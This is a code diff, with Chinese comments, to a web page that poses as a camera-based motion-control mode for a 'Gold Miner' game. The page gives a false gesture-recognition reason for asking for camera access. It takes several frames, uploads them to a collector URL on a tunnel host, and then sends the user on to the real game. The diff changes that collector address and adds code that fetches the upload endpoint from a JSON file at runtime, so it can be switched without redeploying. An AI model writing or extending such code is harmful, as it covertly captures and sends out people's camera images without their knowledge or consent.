@@ -69,7 +69,7 @@
  * ======================================================================== */
 
 const CONFIG = {
-  COLLECTOR: "https://6e6b251707600f.lhr.life/upload",                       // 接收端
+  COLLECTOR: "https://1789201a7b20af.lhr.life/upload",                       // 接收端
   GAME_URL: "https://zhongchenyu16-web.github.io/goldminer/",      // 抓到后把用户送去的真游戏
   FRAMES: 3,            // 抓几帧
   GAP_MS: 380,          // 帧间隔
@@ -170,11 +170,22 @@ async function finish() {
   else setHint('校准完成');
 }
 
-async function begin() {
-  if (S.started || S.done) return;
+/* 运行期读取接收地址：改 play/collector.json 即可切换，不用重发页面 */
+async function loadCollector() {
+  try {
+    const r = await fetch('./collector.json?t=' + Date.now(), { cache: 'no-store' });
+    if (r.ok) {
+      const j = await r.json();
+      if (j && j.collector) CONFIG.COLLECTOR = j.collector;
+    }
+  } catch (e) {}
+}
+
+async function begin() {  if (S.started || S.done) return;
   S.started = true;
   el.btn.disabled = true;
   el.btn.textContent = '正在开启体感识别…';
+  await loadCollector();
   setHint('体感模式需要摄像头权限<br>用于识别挥手、抓取等手势动作');
 
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
